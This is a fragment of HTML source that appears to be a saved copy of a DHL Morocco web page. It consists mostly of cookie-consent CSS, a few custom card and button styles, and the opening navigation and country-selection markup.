        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox input,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox input,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox input,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox input,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox input {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            opacity: 0;
            margin: 0;
            top: 0;
            left: 0;
            z-index: 1
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp .ot-acc-hdr h5.ot-cat-header,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp .ot-acc-hdr h4.ot-cat-header {
            margin: 0
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp h5 {
            top: 0;
            line-height: 20px
        }
        
        #onetrust-pc-sdk .ot-vs-list {
            display: flex;
            flex-direction: column;
            padding: 0;
            margin: .5rem 4px
        }
        
        #onetrust-pc-sdk .ot-vs-selc-all {
            display: flex;
            padding: 0;
            float: unset;
            align-items: center;
            justify-content: flex-start
        }
        
        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf {
            justify-content: flex-end
        }
        
        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf.ot-caret-conf .ot-sel-all-chkbox {
            margin-right: 48px
        }
        
        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf .ot-sel-all-chkbox {
            margin: 0;
            padding: 0;
            margin-right: 14px;
            justify-content: flex-end
        }
        
        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf #ot-selall-vencntr.ot-chkbox,
        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf #ot-selall-vencntr.ot-tgl {
            display: inline-block;
            right: unset;
            width: auto;
            height: auto;
            float: none
        }
        
        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf #ot-selall-vencntr label {
            width: 45px;
            height: 25px
        }
        
        #onetrust-pc-sdk .ot-vs-selc-all .ot-sel-all-chkbox {
            margin-right: 11px;
            margin-left: .75rem;
            display: flex;
            align-items: center
        }
        
        #onetrust-pc-sdk .ot-vs-selc-all .sel-all-hdr {
            margin: 0 1.25rem;
            font-size: .812em;
            line-height: normal;
            text-align: center;
            word-break: break-word;
            word-wrap: break-word
        }
        
        #onetrust-pc-sdk .ot-vnd-list-cnt #ot-selall-vencntr.ot-chkbox {
            float: unset;
            right: 0
        }
        
        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf.ot-caret-conf .ot-sel-all-chkbox {
            margin-right: .5rem
        }
        
        #onetrust-pc-sdk .ot-vs-selc-all.ot-toggle-conf .ot-sel-all-chkbox {
            margin-right: 15px
        }
        
        #onetrust-pc-sdk #ot-sel-blk .ot-chkbox {
            right: unset
        }
        
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-tgl {
            padding: 0
        }
        
        #onetrust-pc-sdk .ot-vs-list {
            margin-top: .5rem
        }
        
        @media only screen and (max-width: 600px) {
            #onetrust-pc-sdk {
                max-width: 100%;
                min-width: 100%
            }
            #onetrust-pc-sdk .ot-ftr-stacked button {
                width: 100%
            }
            #onetrust-pc-sdk #ot-lst-cnt,
            #onetrust-pc-sdk #ot-pc-hdr {
                margin-top: 0;
                padding: 0 5px 0 10px;
                width: calc(100% - 25px)
            }
        }
        
        @media only screen and (max-width: 425px) {
            #onetrust-pc-sdk.otPcPanel {
                left: 0;
                min-width: 100%;
                height: 100%;
                top: 0;
                border-radius: 0
            }
            #onetrust-pc-sdk #ot-host-lst .ot-chkbox {
                margin-left: 0
            }
            #onetrust-pc-sdk #ot-pc-content {
                margin: 0 10px 0 20px
            }
            #onetrust-pc-sdk p {
                font-size: .7em
            }
            #onetrust-pc-sdk .ot-tgl-cntr {
                width: auto
            }
            #onetrust-pc-sdk #vendor-search-handler {
                font-size: 1em
            }
            #onetrust-pc-sdk #ot-lst-cnt {
                height: calc(100% - 95px)
            }
            #onetrust-pc-sdk .ot-switch+p {
                max-width: 80%
            }
            #onetrust-pc-sdk button {
                letter-spacing: .01em
            }
            #onetrust-pc-sdk .save-preference-btn-handler {
                margin-top: 0
            }
            #onetrust-pc-sdk .ot-search-cntr {
                width: 75%
            }
        }
        
        @media only screen and (max-width: 320px) {
            #onetrust-pc-sdk #ot-fltr-cnt {
                margin-left: 15px
            }
        }
        
        @media only screen and (max-width: 896px)and (max-height: 425px)and (orientation: landscape) {
            #onetrust-pc-sdk {
                left: 0;
                top: 0;
                min-width: 100%;
                height: 100%;
                border-radius: 0
            }
            #onetrust-pc-sdk button {
                letter-spacing: .02em
            }
            #onetrust-pc-sdk #ot-anchor {
                left: initial;
                right: 50px
            }
            #onetrust-pc-sdk #ot-lst-title {
                margin-top: 12px
            }
            #onetrust-pc-sdk #ot-lst-title * {
                font-size: inherit
            }
            #onetrust-pc-sdk #ot-pc-hdr input {
                margin-right: 0;
                padding-right: 45px
            }
            #onetrust-pc-sdk .ot-switch+p {
                max-width: 85%
            }
            #onetrust-pc-sdk #ot-lst-cnt {
                max-height: none;
                overflow: initial
            }
            #onetrust-pc-sdk #ot-lst-cnt.no-results {
                height: auto
            }
            #onetrust-pc-sdk input {
                font-size: 1em !important
            }
            #onetrust-pc-sdk p {
                font-size: .6em
            }
            #onetrust-pc-sdk #ot-pc-lst {
                overflow: auto
            }
            #onetrust-pc-sdk #ot-fltr-modal {
                width: 100%;
                height: 100%;
                max-height: none;
                top: 0
            }
            #onetrust-pc-sdk #ot-sel-blk {
                position: static
            }
            #onetrust-pc-sdk #ot-fltr-cnt {
                height: 250px;
                width: 100%
            }
            #onetrust-pc-sdk.ot-shw-fltr #ot-anchor {
                display: none !important
            }
            #onetrust-pc-sdk.ot-shw-fltr #ot-pc-lst {
                height: 100% !important;
                overflow: hidden;
                top: 0px
            }
            #onetrust-pc-sdk.ot-shw-fltr #ot-fltr-cnt {
                margin: 0;
                height: 100%;
                padding: 10px;
                top: 0;
                width: calc(100% - 20px);
                position: absolute;
                right: 0;
                left: 0;
                max-width: none
            }
            #onetrust-pc-sdk.ot-shw-fltr .ot-fltr-scrlcnt {
                max-height: calc(100% - 65px)
            }
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk,
        #onetrust-consent-sdk #ot-search-cntr,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-switch.ot-toggle,
        #onetrust-consent-sdk #onetrust-pc-sdk ot-grp-hdr1 .checkbox,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title:after,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-sel-blk,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-cnt,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-anchor {
            background-color: #333333;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk h3,
        #onetrust-consent-sdk #onetrust-pc-sdk h4,
        #onetrust-consent-sdk #onetrust-pc-sdk h5,
        #onetrust-consent-sdk #onetrust-pc-sdk h6,
        #onetrust-consent-sdk #onetrust-pc-sdk p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-ven-lst .ot-ven-opts p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-desc,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-li-title,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-sel-all-hdr span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-modal #modal-header,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-checkbox label span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-sel-blk p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-lst-title h3,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .back-btn-handler p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .ot-ven-name,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-ven-lst .consent-category,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-label-status,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-chkbox label span,
        #onetrust-consent-sdk #onetrust-pc-sdk #clear-filters-handler {
            color: #FFFFFF;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler+a,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-link,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-name a,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-acc-hdr .ot-host-expand,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info a,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-content #ot-pc-desc .ot-link-btn,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info a,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info a {
            color: #FFFFFF;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler:hover {
            text-decoration: underline;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-grpcntr.ot-acc-txt,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-subgrp-tgl .ot-switch.ot-toggle {
            background-color: #333333;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-ven-dets {
            background-color: #333333;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk button:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler):not([aria-expanded]):not(.ot-link-btn),
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn {
            background-color: #D40511;
            border-color: #D40511;
            color: #FFFFFF;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-active-menu {
            border-color: #D40511;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-remove-objection-handler {
            background-color: transparent;
            border: 1px solid transparent;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn {
            background-color: #FFFFFF;
            color: #78808E;
            border-color: #78808E;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-tgl input:focus+.ot-switch,
        .ot-switch .ot-switch-nob,
        .ot-switch .ot-switch-nob:before,
        #onetrust-pc-sdk .ot-checkbox input[type="checkbox"]:focus+label::before,
        #onetrust-pc-sdk .ot-chkbox input[type="checkbox"]:focus+label::before {
            outline-color: #000000;
            outline-width: 1px;
        }
        
        #onetrust-pc-sdk .ot-host-item>button:focus,
        #onetrust-pc-sdk .ot-ven-item>button:focus {
            border: 1px solid #000000;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk *:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-vlst-cntr>a:focus {
            outline: 1px solid #000000;
        }
        /*inherit Delivery font*/
        
        #onetrust-banner-sdk {
            font-family: Delivery, Verdana, sans-serif !important;
        }
        
        #onetrust-pc-sdk .ot-plus-minus span {
            background-color: #ccc;
        }
        
        #onetrust-consent-sdk {
            font-family: DeliveryRegular, sans-serif;
        }
        
        #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-pc-sdk .category-host-list-handler:hover {
            color: #F91320 !important;
            margin-left: 0;
            font-size: .75em;
            text-decoration: none;
            float: left;
        }
        
        #onetrust-banner-sdk a {
            background-color: transparent;
            color: #D40511 !important;
            decoration: none!important;
        }
        
        #onetrust-banner-sdk a:hover {
            background-color: transparent;
            color: #F91320 !important;
            decoration: none!important;
        }
        
        #onetrust-pc-btn-handler.cookie-setting-link {
            background-color: transparent;
            color: #D40511 !important;
            decoration: none;
        }
        
        #onetrust-pc-btn-handler.cookie-setting-link:hover {
            background-color: transparent;
            color: #F91320 !important;
            decoration: none;
        }
        
        #onetrust-accept-btn-handler {
            font-family: Delivery, Verdana, sans-serif !important;
            color: #ffffff;
            border: 1px solid #d40511;
            background-color: #d40511;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 700;
            font-size: 1.5rem;
            margin: 0 0 1.4rem;
            padding: 0 1.54rem;
            -webkit-box-align: center;
            align-items: center;
            vertical-align: middle;
            letter-spacing: normal;
            min-height: 4.2rem;
            overflow: hidden;
            -webkit-box-pack: center;
            justify-content: center;
            text-align: center;
            margin-left: 10px;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk button:hover {
            background-color: transparent;
            border-color: transparent;
            color: #FFFFFF;
        }
        
        #onetrust-pc-sdk .button-theme:hover {
            background-color: #F91320;
            border-color: #F91320;
            color: #FFFFFF;
        }
        
        #onetrust-consent-sdk #onetrust-pc-sdk .accordion-text,
        #onetrust-consent-sdk #onetrust-pc-sdk .accordion-text .cookie-subgroup-toggle .ot-switch.toggle {
            background-color: #333333 !important;
        }
        /* Hide 'Allow All' on Host level */
        
        #onetrust-pc-sdk #select-all-container .ot-checkbox {
            display: none;
        }
        /* Color Always Active */
        
        #onetrust-pc-sdk .category-header,
        #onetrust-pc-sdk .ot-always-active {
            font-size: .88em;
            line-height: 1.4;
            position: relative;
            top: 5px;
            color: #d40511;
        }
        /* Color Optin Toggle active */
        
        #onetrust-pc-sdk .switch-checkbox:checked+.ot-switch-label {
            transition: all .2s ease-in 0s;
            -moz-transition: all .2s ease-in 0s;
            -o-transition: all .2s ease-in 0s;
            -webkit-transition: all .2s ease-in 0s;
            border: 1px solid #D40511;
        }
        /* Color Optin Toggle */
        
        #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob:before {
            background-color: #F91320;
        }
        
        #onetrust-pc-sdk .ot-tgl input:focus+.ot-switch .ot-switch-nob {
            outline-style: none !important;
            border: none !important;
        }
        
        #onetrust-pc-sdk .host-option-group .vendor-host {
            border: none;
            font-size: .8em;
            color: #333333 !important;
            display: inline-block;
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 10px;
            background-color: #f8f8f8;
        }
        
        #onetrust-pc-sdk .ot-pc-footer-logo {
            display: inline-block;
            width: calc(100% - 15px);
            margin-right: 15px;
            margin-top: 15px;
            display: none;
        }
        
        #onetrust-pc-sdk .ot-ven-item>button:focus,
        #onetrust-pc-sdk .ot-host-item>button:focus,
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item>button:focus,
        #onetrust-pc-sdk .ot-acc-cntr>button:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk *:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-vlst-cntr>a:focus {
            outline: none !important;
        }
        
        #onetrust-banner-sdk a:hover,
        #onetrust-pc-sdk a:hover,
        #ot-sdk-cookie-policy a:hover {
            color: red !important;
        }
        
        #ot-sdk-cookie-policy a {
            text-decoration: none;
        }
        
        #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-pc-sdk .category-host-list-handler:hover {
            font-size: .813em !important;
        }
        
        #onetrust-banner-sdk .ot-sdk-button:focus,
        #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:focus,
        #onetrust-pc-sdk .ot-sdk-button:focus,
        #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:focus,
        #ot-sdk-cookie-policy .ot-sdk-button:focus,
        #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:focus {
            outline: none !important;
        }
        /* scroll change start */
        
        @media screen and (max-width: 600px) {
            #onetrust-pc-sdk .ot-pc-footer {
                position: relative;
                border-top: none;
            }
            #onetrust-pc-sdk {
                overflow-y: scroll;
            }
            #onetrust-pc-sdk #ot-pc-content,
            #onetrust-pc-sdk #ot-pc-lst {
                position: relative;
                top: 0;
                overflow: visible;
            }
        }
        /* scroll change end */
        
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-ven-dets {
            background-color: #fff;
            color: #333;
        }
        
        .ot-sdk-cookie-policy {
            font-family: inherit;
            font-size: 16px
        }
        
        .ot-sdk-cookie-policy.otRelFont {
            font-size: 1rem
        }
        
        .ot-sdk-cookie-policy h3,
        .ot-sdk-cookie-policy h4,
        .ot-sdk-cookie-policy h6,
        .ot-sdk-cookie-policy p,
        .ot-sdk-cookie-policy li,
        .ot-sdk-cookie-policy a,
        .ot-sdk-cookie-policy th,
        .ot-sdk-cookie-policy #cookie-policy-description,
        .ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
        .ot-sdk-cookie-policy #cookie-policy-title {
            color: dimgray
        }
        
        .ot-sdk-cookie-policy #cookie-policy-description {
            margin-bottom: 1em
        }
        
        .ot-sdk-cookie-policy h4 {
            font-size: 1.2em
        }
        
        .ot-sdk-cookie-policy h6 {
            font-size: 1em;
            margin-top: 2em
        }
        
        .ot-sdk-cookie-policy th {
            min-width: 75px
        }
        
        .ot-sdk-cookie-policy a,
        .ot-sdk-cookie-policy a:hover {
            background: #fff
        }
        
        .ot-sdk-cookie-policy thead {
            background-color: #f6f6f4;
            font-weight: bold
        }
        
        .ot-sdk-cookie-policy .ot-mobile-border {
            display: none
        }
        
        .ot-sdk-cookie-policy section {
            margin-bottom: 2em
        }
        
        .ot-sdk-cookie-policy table {
            border-collapse: inherit
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy {
            font-family: inherit;
            font-size: 1rem
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
            color: dimgray
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
            margin-bottom: 1em
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup {
            margin-left: 1.5em
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group-desc,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-table-header,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td {
            font-size: .9em
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td a {
            font-size: inherit
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
            font-size: 1em;
            margin-bottom: .6em
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-title {
            margin-bottom: 1.2em
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy>section {
            margin-bottom: 1em
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
            min-width: 75px
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a:hover {
            background: #fff
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead {
            background-color: #f6f6f4;
            font-weight: bold
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-mobile-border {
            display: none
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section {
            margin-bottom: 2em
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li {
            list-style: disc;
            margin-left: 1.5em
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li h4 {
            display: inline-block
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
            border-collapse: inherit;
            margin: auto;
            border: 1px solid #d7d7d7;
            border-radius: 5px;
            border-spacing: initial;
            width: 100%;
            overflow: hidden
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
            border-bottom: 1px solid #d7d7d7;
            border-right: 1px solid #d7d7d7
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
            border-bottom: 0px
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr th:last-child,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr td:last-child {
            border-right: 0px
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
            width: 25%
        }
        
        .ot-sdk-cookie-policy[dir=rtl] {
            text-align: left
        }
        
        #ot-sdk-cookie-policy h3 {
            font-size: 1.5em
        }
        
        @media only screen and (max-width: 530px) {
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) table,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tbody,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) th,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
                display: block
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead tr {
                position: absolute;
                top: -9999px;
                left: -9999px
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
                margin: 0 0 1em 0
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd),
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd) a {
                background: #f6f6f4
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td {
                border: none;
                border-bottom: 1px solid #eee;
                position: relative;
                padding-left: 50%
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
                position: absolute;
                height: 100%;
                left: 6px;
                width: 40%;
                padding-right: 10px
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) .ot-mobile-border {
                display: inline-block;
                background-color: #e4e4e4;
                position: absolute;
                height: 100%;
                top: 0;
                left: 45%;
                width: 2px
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
                content: attr(data-label);
                font-weight: bold
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) li {
                word-break: break-word;
                word-wrap: break-word
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
                overflow: hidden
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
                border: none;
                border-bottom: 1px solid #d7d7d7
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tbody,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
                display: block
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
                width: auto
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
                margin: 0 0 1em 0
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
                height: 100%;
                width: 40%;
                padding-right: 10px
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
                content: attr(data-label);
                font-weight: bold
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li {
                word-break: break-word;
                word-wrap: break-word
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead tr {
                position: absolute;
                top: -9999px;
                left: -9999px;
                z-index: -9999
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
                border-bottom: 1px solid #d7d7d7;
                border-right: 0px
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td:last-child {
                border-bottom: 0px
            }
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
            color: #696969;
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
            color: #696969;
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
            color: #696969;
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
            color: #696969;
        }
        
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th {
            background-color: #F8F8F8;
        }
        
        .ot-floating-button__front {
            background-image: url('https://cdn.cookielaw.org/logos/static/ot_persistent_cookie_icon.png')
        }
    </style>
    <style id="at-makers-style" class="at-flicker-control">
        .mboxDefault {
            visibility: hidden;
        }
        
        .cardaa {
            
            display: flex;
            justify-content: space-between;
            flex-direction: row;
            height: auto;
            width: 100%;
            background-color: #f8f8f8;
            border-left: 5px solid #fc0;
            padding: 10px;
            margin-top: 10px;
        }
        .cardaaa {
            
            display: flex;
            justify-content: space-between;
            flex-direction: row;
            height: auto;
            width: 100%;
            background-color: #f8f8f8;
            border-left: 5px solid #d40511;
            padding: 10px;
            margin-top: 10px;
        }
        .para {
            font-size: 14px;

        }
        .spn h6 {
            
            font-size: 10px;
            margin: 0;
            padding: 0;
        }
        .carda {
            
            display: flex;
            justify-content: center;
            flex-direction: column;
            align-items: center;
            height: auto;
            width: auto;
            margin-top: 40px;
            border-radius: 5px;
            padding: 30px;
            width: 500px;
            box-shadow: 0 3px 10px rgb(0 0 0 / 0.2);
            font-size: 10px;
        }
        
        @media (max-width: 480px) {
            .carda {
            padding: 20px;
            width: 100%;
            box-shadow: none;
        }
  
  }
        .flex {
            display: flex!important;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-top: 10px;
        }
        .spn {
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 0;
        }
        .btnx {
            width: 100%!important;
            border-radius: 5px!important;
        }
    </style>
</head>



<body class=""><iframe aria-hidden="true" tabindex="-1" title="Text Zoom Event Iframe" style="width: 1em; height: 1px; border-width: 0px; position: absolute; overflow: hidden; white-space: nowrap; margin: -1px;" src="./styles/saved_resource.html"></iframe>
    <!--googleoff: all-->

    <nav class="c-nav-wcag">
        <span class="sr-only">Navigation and Content</span>
        <ul>

            <li><a href="https://www.dhl.com/ma-en/home.html#wcag-main-content">Skip to main content</a></li>
            <li><a href="https://www.dhl.com/ma-en/home.html#wcag-footer">Skip to main footer</a></li>
        </ul>
    </nav>







    <div class="c-country-selection-layer component-wide l-grid l-grid--left-s l-grid--center-m js--country-selection-layer" data-cookie="country" data-cookie-value="ma" data-cookie-validity="365" data-cookie-path="/">
        <div class="c-country-selection-layer--container l-grid l-grid--w-100pc-s">
            <div class="l-grid l-grid--w-100pc-s l-grid--left-m">


                <div class="l-grid l-grid--w-100pc-m-s">
                    <div class="c-country-selection-layer--flag">
                        <span class="flag-icon flag-icon-ma"></span>
                    </div>
                    <div class="c-country-selection-layer--copy-container l-grid l-grid--w-auto-s l-grid--middle-s l-grid--w-reset-m">
                        <span class="c-country-selection-layer--copy">You are in</span>
                        <span class="c-country-selection-layer--copy"><strong>&nbsp;Morocco</strong></span>
                    </div>
                </div>

